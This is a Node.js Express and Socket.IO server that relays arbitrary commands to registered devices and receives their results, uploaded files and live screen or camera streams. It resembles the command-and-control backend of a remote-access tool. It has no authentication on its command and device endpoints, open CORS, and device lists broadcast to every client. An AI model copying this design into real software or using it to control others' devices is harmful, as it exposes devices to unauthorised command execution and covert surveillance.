const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

// In-memory storage
const devices = new Map();
const users = new Map();
const commands = new Map();
const sessions = new Map();

// Device connection handler
io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // Device registration
    socket.on('device:register', (data) => {
        const deviceId = data.deviceId || socket.id;
        const device = {
            id: deviceId,
            socketId: socket.id,
            userId: data.userId,
            deviceInfo: data.deviceInfo || {},
            online: true,
            connectedAt: new Date(),
            lastSeen: new Date()
        };

        devices.set(deviceId, device);
        console.log('Device registered:', deviceId);

        // Notify all admins
        io.emit('device:connected', device);
        
        // Send device list to all clients
        io.emit('device:list', Array.from(devices.values()));
    });

    // User login
    socket.on('user:login', (data) => {
        sessions.set(socket.id, {
            userId: data.userId,
            email: data.email,
            role: data.role || 'user',
            connectedAt: new Date()
        });

        // Send device list to user
        const userDevices = Array.from(devices.values()).filter(d => d.userId === data.userId);
        socket.emit('device:list', userDevices);
    });

    // Command handling
    socket.on('command:send', (data) => {
        const { deviceId, command, commandData } = data;
        const device = devices.get(deviceId);

        if (device && device.online) {
            const commandId = Date.now().toString();
            const cmd = {
                id: commandId,
                deviceId,
                command,
                data: commandData,
                sentAt: new Date(),
                status: 'pending'
            };

            commands.set(commandId, cmd);

            // Send command to device
            io.to(device.socketId).emit('command:execute', cmd);

            console.log('Command sent:', command, 'to device:', deviceId);
        } else {
            socket.emit('command:error', { message: 'Device offline or not found' });
        }
    });

    // Command response from device
    socket.on('command:response', (data) => {
        const { commandId, response, error } = data;
        const cmd = commands.get(commandId);

        if (cmd) {
            cmd.status = error ? 'failed' : 'success';
            cmd.response = response;
            cmd.error = error;
            cmd.completedAt = new Date();

            // Find device and notify its owner
            const device = devices.get(cmd.deviceId);
            if (device) {
                const userSessions = Array.from(sessions.entries())
                    .filter(([sid, session]) => session.userId === device.userId);

                userSessions.forEach(([sid]) => {
                    io.to(sid).emit('command:result', {
                        commandId,
                        command: cmd.command,
                        response,
                        error
                    });
                });
            }
        }
    });

    // File upload from device
    socket.on('file:upload', (data) => {
        const { deviceId, fileName, fileData, fileType } = data;
        
        // Broadcast to user sessions
        const device = devices.get(deviceId);
        if (device) {
            const userSessions = Array.from(sessions.entries())
                .filter(([sid, session]) => session.userId === device.userId);

            userSessions.forEach(([sid]) => {
                io.to(sid).emit('file:received', {
                    deviceId,
                    fileName,
                    fileData,
                    fileType,
                    receivedAt: new Date()
                });
            });
        }
    });

    // Live data streaming (screen, camera, etc.)
    socket.on('stream:data', (data) => {
        const { deviceId, streamType, streamData } = data;
        const device = devices.get(deviceId);

        if (device) {
            const userSessions = Array.from(sessions.entries())
                .filter(([sid, session]) => session.userId === device.userId);

            userSessions.forEach(([sid]) => {
                io.to(sid).emit('stream:update', {
                    deviceId,
                    streamType,
                    data: streamData,
                    timestamp: new Date()
                });
            });
        }
    });

    // Device heartbeat
    socket.on('device:heartbeat', (data) => {
        const device = devices.get(data.deviceId);
        if (device) {
            device.lastSeen = new Date();
            device.deviceInfo = { ...device.deviceInfo, ...data.deviceInfo };
        }
    });

    // Get device info
    socket.on('device:get_info', (data) => {
        const device = devices.get(data.deviceId);
        if (device) {
            socket.emit('device:info', device.deviceInfo);
        }
    });

    // Refresh device list
    socket.on('device:refresh', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            const userDevices = Array.from(devices.values())
                .filter(d => d.userId === session.userId);
            socket.emit('device:list', userDevices);
        } else {
            socket.emit('device:list', Array.from(devices.values()));
        }
    });

    // Disconnect device
    socket.on('device:disconnect', (data) => {
        const device = devices.get(data.deviceId);
        if (device) {
            io.to(device.socketId).emit('device:force_disconnect');
            devices.delete(data.deviceId);
            io.emit('device:list', Array.from(devices.values()));
        }
    });

    // Handle disconnection
    socket.on('disconnect', () => {
        console.log('Disconnected:', socket.id);

        // Remove device if it was a device connection
        for (const [deviceId, device] of devices.entries()) {
            if (device.socketId === socket.id) {
                device.online = false;
                device.lastSeen = new Date();
                io.emit('device:disconnected', device);
                io.emit('device:list', Array.from(devices.values()));
                break;
            }
        }

        // Remove session
        sessions.delete(socket.id);
    });
});

// REST API endpoints
app.get('/api/devices', (req, res) => {
    res.json(Array.from(devices.values()));
});

app.get('/api/devices/:deviceId', (req, res) => {
    const device = devices.get(req.params.deviceId);
    if (device) {
        res.json(device);
    } else {
        res.status(404).json({ error: 'Device not found' });
    }
});

app.post('/api/commands', (req, res) => {
    const { deviceId, command, data } = req.body;
    const device = devices.get(deviceId);

    if (device && device.online) {
        const commandId = Date.now().toString();
        const cmd = {
            id: commandId,
            deviceId,
            command,
            data,
            sentAt: new Date(),
            status: 'pending'
        };

        commands.set(commandId, cmd);
        io.to(device.socketId).emit('command:execute', cmd);

        res.json({ success: true, commandId });
    } else {
        res.status(404).json({ error: 'Device offline or not found' });
    }
});

app.get('/api/commands/:commandId', (req, res) => {
    const cmd = commands.get(req.params.commandId);
    if (cmd) {
        res.json(cmd);
    } else {
        res.status(404).json({ error: 'Command not found' });
    }
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'ok',
        devices: devices.size,
        sessions: sessions.size,
        commands: commands.size,
        uptime: process.uptime()
    });
});

// Serve frontend
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// Start server
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 Device endpoint: http://localhost:${PORT}`);
    console.log(`💻 Admin panel: http://localhost:${PORT}/admin-login.html`);
});

// Cleanup old commands every hour
setInterval(() => {
    const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
    for (const [commandId, cmd] of commands.entries()) {
        if (cmd.completedAt && cmd.completedAt < oneHourAgo) {
            commands.delete(commandId);
        }
    }
}, 60 * 60 * 1000);

// Check device heartbeats every 30 seconds
setInterval(() => {
    const thirtySecondsAgo = new Date(Date.now() - 30 * 1000);
    for (const [deviceId, device] of devices.entries()) {
        if (device.lastSeen < thirtySecondsAgo && device.online) {
            device.online = false;
            io.emit('device:disconnected', device);
            io.emit('device:list', Array.from(devices.values()));
        }
    }
}, 30 * 1000);
